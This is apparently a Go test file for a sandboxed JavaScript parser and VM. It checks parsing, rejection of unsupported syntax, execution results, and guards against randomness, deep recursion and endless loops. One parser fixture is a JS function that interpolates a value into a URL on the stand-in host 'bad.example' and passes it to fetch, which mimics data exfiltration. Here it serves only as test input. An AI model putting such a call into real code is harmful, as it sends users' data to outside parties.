package js

import (
	"context"
	"errors"
	"slices"
	"testing"
	"time"
)

func TestParseCollectsIdentifiersAndStrings(t *testing.T) {
	src := `
const greeting = "hello";
function compute(x) {
  const url = ` + "`https://bad.example/${x}`" + `;
  return fetch(url, greeting);
}
`
	prog, err := Parse("app.js", src)
	if err != nil {
		t.Fatalf("Parse failed: %v", err)
	}
	for _, want := range []string{"greeting", "compute", "fetch", "url"} {
		if !slices.Contains(prog.Identifiers, want) {
			t.Errorf("missing identifier %q in %v", want, prog.Identifiers)
		}
	}
	for _, want := range []string{"hello", "https://bad.example/"} {
		if !slices.Contains(prog.Strings, want) {
			t.Errorf("missing string %q in %v", want, prog.Strings)
		}
	}
}

func TestParseRejectsUnsupportedAndMalformed(t *testing.T) {
	unsupported := []string{
		"async function f() {}",
		"class Foo {}",
		"import x from 'y';",
		"export const a = 1;",
		"function* gen() { yield 1; }",
	}
	for _, src := range unsupported {
		_, err := Parse("test.js", src)
		if !errors.Is(err, ErrUnsupported) {
			t.Errorf("Parse(%q) = %v, want ErrUnsupported", src, err)
		}
	}

	malformed := []string{
		"function (",
		"const x = ;",
		"\"unterminated",
	}
	for _, src := range malformed {
		_, err := Parse("test.js", src)
		if !errors.Is(err, ErrSyntax) {
			t.Errorf("Parse(%q) = %v, want ErrSyntax", src, err)
		}
	}
}

func TestVMExecutionFeatures(t *testing.T) {
	src := `
function runAll(input) {
  // Hoisting and closures
  const add = makeAdder(input.base);
  function makeAdder(b) {
    return (x) => b + x;
  }

  // Loops, break, continue, array methods
  const nums = [1, 2, 3, 4, 5];
  let sum = 0;
  for (const n of nums) {
    if (n === 2) continue;
    if (n === 5) break;
    sum += add(n);
  }

  // Switch and try/catch/finally
  let label = "";
  switch (input.mode) {
    case "a":
      label = "alpha";
      break;
    default:
      label = "other";
  }

  let caught = false;
  let finalized = false;
  try {
    throw new Error("boom");
  } catch (e) {
    caught = e.message === "boom";
  } finally {
    finalized = true;
  }

  // Fixed UTC clock and JSON round-trip
  const epoch = Date.now();
  const iso = new Date().toISOString();
  const copy = JSON.parse(JSON.stringify({ sum: sum, mapped: nums.map(n => n * 2).filter(n => n > 4) }));

  return {
    sum: copy.sum,
    mapped: copy.mapped,
    label: label,
    caught: caught && finalized,
    epoch: epoch,
    iso: iso
  };
}
`
	prog, err := Parse("calc.js", src)
	if err != nil {
		t.Fatalf("Parse: %v", err)
	}
	vm := NewVM()
	if err := vm.RunProgram(context.Background(), prog); err != nil {
		t.Fatalf("Run: %v", err)
	}
	if !vm.HasFunction("runAll") {
		t.Fatal("HasFunction(runAll) = false")
	}
	got, err := vm.CallJSON(context.Background(), "runAll", []byte(`{"base":10,"mode":"a"}`))
	if err != nil {
		t.Fatalf("CallJSON: %v", err)
	}
	want := `{"sum":38,"mapped":[6,8,10],"label":"alpha","caught":true,"epoch":946684800000,"iso":"2000-01-01T00:00:00.000Z"}`
	if got != want {
		t.Errorf("got  %s\nwant %s", got, want)
	}
}

func TestVMDeterministicGuards(t *testing.T) {
	t.Run("Math.random throws", func(t *testing.T) {
		prog, err := Parse("rand.js", `function f() { return Math.random(); }`)
		if err != nil {
			t.Fatal(err)
		}
		vm := NewVM()
		if err := vm.RunProgram(context.Background(), prog); err != nil {
			t.Fatal(err)
		}
		_, err = vm.CallJSON(context.Background(), "f", []byte(`{}`))
		if !errors.Is(err, ErrRuntime) {
			t.Fatalf("got %v, want ErrRuntime", err)
		}
	})

	t.Run("recursion stack limit", func(t *testing.T) {
		prog, err := Parse("rec.js", `function f(n) { return f(n + 1); }`)
		if err != nil {
			t.Fatal(err)
		}
		vm := NewVM()
		if err := vm.RunProgram(context.Background(), prog); err != nil {
			t.Fatal(err)
		}
		_, err = vm.CallJSON(context.Background(), "f", []byte(`0`))
		if !errors.Is(err, ErrRuntime) {
			t.Fatalf("got %v, want ErrRuntime", err)
		}
	})

	t.Run("deadline interruption", func(t *testing.T) {
		prog, err := Parse("spin.js", `function f() { while (true) {} }`)
		if err != nil {
			t.Fatal(err)
		}
		vm := NewVM()
		if err := vm.RunProgram(context.Background(), prog); err != nil {
			t.Fatal(err)
		}
		ctx, cancel := context.WithTimeout(context.Background(), 20*time.Millisecond)
		defer cancel()
		_, err = vm.CallJSON(ctx, "f", []byte(`null`))
		if !errors.Is(err, ErrInterrupted) {
			t.Fatalf("got %v, want ErrInterrupted", err)
		}
	})
}
